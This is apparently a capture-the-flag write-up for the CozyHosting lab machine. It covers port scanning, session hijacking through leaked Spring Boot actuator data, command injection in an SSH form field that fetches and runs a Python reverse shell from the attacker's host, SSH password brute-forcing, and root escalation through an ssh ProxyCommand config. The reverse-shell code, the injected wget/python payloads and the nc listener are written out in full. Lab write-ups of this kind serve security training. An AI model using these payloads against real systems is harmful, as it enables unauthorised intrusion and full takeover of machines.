## Port Scan

To scan faster all the ports, we use the SYN scan only. Then we move to a more accurate scan on relevant ports.

```shell
└─$ sudo nmap -sS -p1-65000 10.129.12.20
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-06 19:43 CET
Nmap scan report for 10.129.12.20
Host is up (0.048s latency).
Not shown: 64998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 40.64 seconds

```

Only a web server and the usual ssh.

## Directory Enumeration

```shell
─$ gobuster dir -u http://cozyhosting.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cozyhosting.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 12706]
/login                (Status: 200) [Size: 4431]
/admin                (Status: 401) [Size: 97]
/logout               (Status: 204) [Size: 0]
/error                (Status: 500) [Size: 73]
/http%3A%2F%2Fwww     (Status: 400) [Size: 435]
/http%3A%2F%2Fyoutube (Status: 400) [Size: 435]
/%C0                  (Status: 400) [Size: 435]
/http%3A%2F%2Fblogs   (Status: 400) [Size: 435]
/http%3A%2F%2Fblog    (Status: 400) [Size: 435]
/**http%3A%2F%2Fwww   (Status: 400) [Size: 435]
/27079%5Fclassicpeople2%2Ejpg (Status: 200) [Size: 0]
/children%2527s_tent  (Status: 200) [Size: 0]
/tiki%2Epng           (Status: 200) [Size: 0]
/Wanted%2e%2e%2e      (Status: 200) [Size: 0]
/How_to%2e%2e%2e      (Status: 200) [Size: 0]
/External%5CX-News    (Status: 400) [Size: 435]
/squishdot_rss10%2Etxt (Status: 200) [Size: 0]
/b33p%2Ehtml          (Status: 200) [Size: 0]
/help%2523drupal      (Status: 200) [Size: 0]
/http%3A%2F%2Fcommunity (Status: 400) [Size: 435]
/http%3A%2F%2Fradar   (Status: 400) [Size: 435]
/%CF                  (Status: 400) [Size: 435]
/%D8                  (Status: 400) [Size: 435]
/%CE                  (Status: 400) [Size: 435]
/%CD                  (Status: 400) [Size: 435]
/%CB                  (Status: 400) [Size: 435]
/%CC                  (Status: 400) [Size: 435]
/%CA                  (Status: 400) [Size: 435]
/%D1                  (Status: 400) [Size: 435]
/%D0                  (Status: 400) [Size: 435]
/%D6                  (Status: 400) [Size: 435]
/%D7                  (Status: 400) [Size: 435]
/%D5                  (Status: 400) [Size: 435]
/%D3                  (Status: 400) [Size: 435]
/%D4                  (Status: 400) [Size: 435]
/%D2                  (Status: 400) [Size: 435]
/%C9                  (Status: 400) [Size: 435]
/%C1                  (Status: 400) [Size: 435]
/%C8                  (Status: 400) [Size: 435]
/%C2                  (Status: 400) [Size: 435]
/%C7                  (Status: 400) [Size: 435]
/%C5                  (Status: 400) [Size: 435]
/%C6                  (Status: 400) [Size: 435]
/%C4                  (Status: 400) [Size: 435]
/%C3                  (Status: 400) [Size: 435]
/%D9                  (Status: 400) [Size: 435]
/%DF                  (Status: 400) [Size: 435]
/%DD                  (Status: 400) [Size: 435]
/%DE                  (Status: 400) [Size: 435]
/%DB                  (Status: 400) [Size: 435]
/http%3A%2F%2Fjeremiahgrossman (Status: 400) [Size: 435]
/http%3A%2F%2Fweblog  (Status: 400) [Size: 435]
/http%3A%2F%2Fswik    (Status: 400) [Size: 435]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

## Spring Boot

The `/error` shows an interesting error message that reveals the backend of the admin page is probably made with Spring Boot. By testing some of the spring boot actuators available at https://raw.githubusercontent.com/artsploit/SecLists/master/Discovery/Web-Content/spring-boot.txt it is possible to find some additional information leak:

```shell
└─$ gobuster dir -u http://cozyhosting.htb -w spr.txt                                                     
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cozyhosting.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                spr.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/actuator             (Status: 200) [Size: 634]
/actuator/env         (Status: 200) [Size: 4957]
/actuator/health      (Status: 200) [Size: 15]
/actuator/mappings    (Status: 200) [Size: 9938]
/actuator/beans       (Status: 200) [Size: 127224]
Progress: 34 / 35 (97.14%)
===============================================================
Finished
===============================================================

```

Where spr.txt is the content of the file at the link above (a list of actuator URIs)
Let's analyze the leaked information now.

## Spring Sessions

Looking into `actuator/mappings` a `sessions` actuator is revealed. A session for the user kanderson is available and it shows the JSESSIONID that is usable as a cookie to reach the `/admin` site.

Doing a simple GET request using 

```
Cookie: JSESSIONID=4D5A3D4DC1A02DDC91B21393BB18B596
```

will give access to the admin portal. Notice that this session id changes continuously!

## SSH Shell

The admin panel allows for connections via SSH via a POST form. It allows to set the username and the host to connect to. This command will work then:

```shell
curl http://cozyhosting.htb/executessh -i  -X POST -d "host=10.10.14.47&username=kali"
```

And will print out the result of the command. Some tests have to be performed to discover something useful. Basically commands can be injected in the username.

## Prepare Python Reverse Shell

We prepare a reverse shell in Python, in the file `pysh.py`

```python
import os
import pty
import sys
import socket
s=socket.socket()
print('CAZZO', file=sys.stderr)
s.connect(("10.10.14.47", 24387))
[os.dup2(s.fileno(),f) for f in (0,1,2)]
pty.spawn("sh")
```

then we prepare a webserver to serve it to the machine:

```shell
python -m http.server
```

In the same folder of the file file `pysh.py`

## Command injection

Now we can inject the command to download the file

```shell
curl http://cozyhosting.htb/executessh -i  -X POST -d "host=localhost&username=kali;wget\${IFS}10.10.14.47:8000/pysh.py\${IFS}-O\${IFS}/tmp/pysh.py;"
```

We use `\${IFS}` because the username is sanitized.

Finally we run the listener on our side:

```shell
nc -lvnp 24387
```

And another command injection on the machine side

```shell
curl http://cozyhosting.htb/executessh -i  -X POST -d "host=localhost&username=kali;python3\${IFS}/tmp/pysh.py;"
HTTP/1.1 504 Gateway Time-out
```

And we have the reverse shell!

## Find a Valid User

The home directory contains a user: josh. This is the user that we can probably exploit to get the `user.txt` file. As we can't find many ways to do a lateral movement, we brute force the login of josh in the ssh, using Hydra

And that returns the password: `manchesterunited` so we are in, we can read the user flag into the user home.

## Privilege Escalation

The user Josh can execute `/usr/bin/ssh` as root. This is the vector to be used.
SSH has a feature called ProxyCommand that allows the execution of some code before the connection starts. One can create an SSH config file in `~/.ssh/config` like:

```shell
Host localhost
  ProxyCommand sh -c "python3 /home/josh/pysh.py"
```

So any connection to localhost will execute this code with the same user as the user of the ssh client process.

If ssh is used to connect to localhost with josh as user then this code will be executed. It is enough to place a `pysh.py` into josh's home to execute the reverse shell. The file is identical to the one above.

Now, two problems: doing that will only create a reverse shell from josh. Plus when executing as `sudo` the file `~/.ssh/config` will not be used because that is josh's file and the process runs as user. So even using `sudo` this will not work.

Anyway it is enough to use the flag `-F` to make it work.

```shell
sudo ssh -F /home/josh/.ssh/config josh@localhost
```

This will open a reverse shell to a listener and the shell will have root privileges. 

